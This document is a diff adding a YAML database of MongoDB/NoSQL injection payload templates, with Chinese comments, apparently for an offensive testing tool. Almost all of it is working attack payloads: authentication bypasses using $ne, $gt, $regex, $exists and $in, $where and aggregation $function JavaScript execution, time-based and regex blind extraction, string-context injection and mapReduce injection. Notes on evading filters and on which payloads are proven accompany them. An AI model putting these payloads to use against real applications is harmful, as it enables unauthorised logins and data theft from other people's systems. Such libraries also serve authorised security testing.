@@ -1,0 +1,285 @@
+ruleDB: v0.1.0
+# MongoDB / NoSQL 注入模板。
+#
+# 这一类逼出了新的提交方式 `json-body`：**载荷常常是 JSON 对象，不是字符串**。
+# `{"$ne": null}` 用原来的 `json` 提交方式会被当成字段的**字符串值**塞进去，
+# 变成 `"{\"$ne\": null}"` —— 完全不是一个东西。所以载荷是整段 JSON 体时用 `json-body`。
+#
+# content_type 用 json：这些载荷本身就是合法 JSON，运行期能做真语法校验。
+
+templates:
+  - id: nosql.mongodb.auth.bypass.ne
+    name: MongoDB 登录绕过（$ne）
+    desc: 把用户名和密码都换成"不等于 null"，绕开登录校验。字段名按目标实际接口改
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: "*"
+    slots:
+      uf: {options: ["username", "user", "email", "login", "account"], default: "username"}
+      pf: {options: ["password", "pass", "pwd", "passwd"], default: "password"}
+    body: '{"<<uf>>":{"$ne":null},"<<pf>>":{"$ne":null}}'
+    vars: []
+    requires: [fetch-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: nosql.mongodb.auth.bypass.gt
+    name: MongoDB 登录绕过（$gt）
+    desc: 同上是永真，但用的是大于空串。某些驱动过滤了 $ne 时可用
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: "*"
+    slots:
+      uf: {options: ["username", "user", "email", "login"], default: "username"}
+      pf: {options: ["password", "pass", "pwd"], default: "password"}
+    body: '{"<<uf>>":{"$gt":""},"<<pf>>":{"$gt":""}}'
+    vars: []
+    requires: [fetch-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: nosql.mongodb.auth.bypass.regex
+    name: MongoDB 登录绕过（$regex）
+    desc: 用正则匹配任意值。$ne / $gt 都被过滤时试这条
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: "*"
+    slots:
+      uf: {options: ["username", "user", "email", "login"], default: "username"}
+      pf: {options: ["password", "pass", "pwd"], default: "password"}
+    body: '{"<<uf>>":{"$regex":"^.*"},"<<pf>>":{"$regex":"^.*"}}'
+    vars: []
+    requires: [fetch-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: nosql.mongodb.auth.bypass.in
+    name: MongoDB 指定账号免密（$in）
+    desc: 已知用户名时，用 $in 命中该账号并让密码条件恒真
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: "*"
+    slots:
+      uf: {options: ["username", "user", "email", "login"], default: "username"}
+      pf: {options: ["password", "pass", "pwd"], default: "password"}
+    body: '{"<<uf>>":{"$in":["<<user>>"]},"<<pf>>":{"$ne":null}}'
+    vars: [user]
+    requires: [fetch-sink, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: nosql.mongodb.where.true
+    name: MongoDB $where 恒真
+    desc: $where 会执行 JS，是 NoSQL 里唯一能跑任意逻辑的入口
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: "*"
+    body: '{"$where":"return true"}'
+    vars: []
+    requires: [fetch-sink, weak-hardening]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: nosql.mongodb.where.sleep
+    name: MongoDB $where 时间盲注
+    desc: $where 里没有 sleep，只能空转烧 CPU 制造延时；阈值需按目标机器标定
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: "*"
+    slots:
+      ms: {options: ["3000", "5000", "10000"], default: "5000"}
+    # `<<<ms>>` 三个尖括号是**对的**：字面量 `<` + 占位符 `<<ms>>`。
+    # 写成两个会得到 `-d5000`，把小于号吃掉。
+    body: '{"$where":"function(){var d=new Date();while(new Date()-d<<<ms>>){};return true;}"}'
+    vars: []
+    requires: [fetch-sink, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: nosql.mongodb.blind.regex
+    name: MongoDB 正则盲注
+    desc: 逐字符猜值：把 ^前缀 换成候选，响应有差异即命中
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: "*"
+    slots:
+      uf: {options: ["username", "user", "email", "login"], default: "username"}
+    body: '{"<<uf>>":{"$regex":"^<<prefix>>"}}'
+    vars: [prefix]
+    requires: [fetch-sink, boolean]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 字符串上下文 ----
+  # 注入点不是 JSON body，而是拼进查询字符串时走这两条。
+
+  - id: nosql.mongodb.string.or
+    name: MongoDB 字符串上下文恒真
+    desc: 注入点被拼进查询字符串（非 JSON body）时用
+    vuln: [nosql]
+    content_type: [raw]
+    component: [mongodb]
+    version: "*"
+    body: "' || '1'=='1"
+    vars: []
+    requires: [fetch-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: nosql.mongodb.string.terminate
+    name: MongoDB 字符串上下文截断
+    desc: 用注释掉后续条件，常配合上面的恒真一起用
+    vuln: [nosql]
+    content_type: [raw]
+    component: [mongodb]
+    version: "*"
+    body: "'; return true; //"
+    vars: []
+    requires: [fetch-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: nosql.mongodb.auth.bypass.exists
+    name: MongoDB 登录绕过（$exists）
+    desc: $ne / $gt / $regex 都被过滤时试这条——只要求字段存在，不比较内容
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: "*"
+    slots:
+      uf: {options: ["username", "user", "email", "login"], default: "username"}
+      pf: {options: ["password", "pass", "pwd"], default: "password"}
+    body: '{"<<uf>>":{"$exists":true},"<<pf>>":{"$exists":true}}'
+    vars: []
+    requires: [fetch-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: nosql.mongodb.blind.where
+    name: MongoDB $where 正则盲注
+    desc: 用 JS 正则逐字符猜，比 $where 空转省时间得多。field 按目标文档结构改
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: "*"
+    body: '{"$where":"this.<<field>>.match(/^<<prefix>>/)"}'
+    vars: [field, prefix]
+    requires: [fetch-sink, boolean, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 聚合管道 ----
+  # 注入点不是 find 的查询条件，而是 aggregate 的管道数组（$match / $group / $lookup
+  # 那一串）时走这三条。$where 在管道里用不了，能跑 JS 的换成了 $function（MongoDB 4.4+），
+  # 它出现在 $expr 里是合法的。
+
+  - id: nosql.mongodb.aggregate.function
+    name: MongoDB 聚合 $function 执行 JS
+    desc: >-
+      管道里的 $expr 支持 $function（4.4 起），body 是一段真的 JS——这是 $where
+      之外唯一能跑任意逻辑的入口，也是聚合注入里最直接的。前提是没开
+      --noscripting、服务端 4.4+、且用户输入能进到管道阶段里。只用来证明能执行时，
+      返回 true 最省事；要带出数据就用 $function 的返回值当条件做布尔盲注。
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: ">=4.4"
+    body: |-
+      {"$match":{"$expr":{"$function":{"body":"function(){ return true; }","args":[],"lang":"js"}}}}
+    vars: []
+    requires: [fetch-sink, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: nosql.mongodb.aggregate.function.sleep
+    name: MongoDB 聚合 $function 时间盲注
+    desc: >-
+      上一条的盲注版：$function 里空转烧 CPU 制造延时，响应慢就是命中。阈值要按
+      目标机器标定——空转在快机器上 3 秒、慢机器上可能要 10 秒，先在无害条件上
+      量一次基线再猜。开了 --noscripting 或 4.4 以下时整条无效。
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: ">=4.4"
+    slots:
+      ms: {options: ["1000", "3000", "5000", "10000"], default: "5000"}
+    body: |-
+      {"$match":{"$expr":{"$function":{"body":"function(){ var d = new Date(); while (new Date() - d <<<ms>>) {} return true; }","args":[],"lang":"js"}}}}
+    vars: []
+    requires: [fetch-sink, weak-hardening, boolean]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: nosql.mongodb.aggregate.expr.field
+    name: MongoDB 聚合 $expr 引用字段
+    desc: >-
+      聚合表达式里的 $字段名 引用的是文档自己的字段，不是查询参数。
+      所以把密码条件写成「密码等于它自己」就恒真——$ne / $gt 这类操作符被过滤、
+      但 $expr 没被挡时用这条。字段名按目标文档结构改，用户名条件要另配一个正常值。
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: ">=3.6"
+    slots:
+      pf: {options: ["password", "pass", "pwd", "passwd", "secret"], default: "password"}
+    body: |-
+      {"$expr":{"$eq":["$<<pf>>","$<<pf>>"]}}
+    vars: []
+    requires: [fetch-sink, weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: nosql.mongodb.mapreduce
+    name: MongoDB mapReduce 注入
+    desc: >-
+      mapReduce 命令的 map / reduce 是用户可读的 JS 字符串，进了服务端就由
+      SpiderMonkey 执行——老接口、老文档里比 $where 更常被忽略。前提是应用把用户
+      输入拼进了 mapReduce 命令（少见但存在），且没开 --noscripting。
+      返回 inline 结果时不需要目标有可写集合。$where 已被挡住时值得试。
+    vuln: [nosql]
+    content_type: [json]
+    component: [mongodb]
+    version: "*"
+    body: |-
+      {"map":"function(){ emit(1, 1); }","reduce":"function(k, v){ return v; }","out":{"inline":1}}
+    vars: []
+    requires: [fetch-sink, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
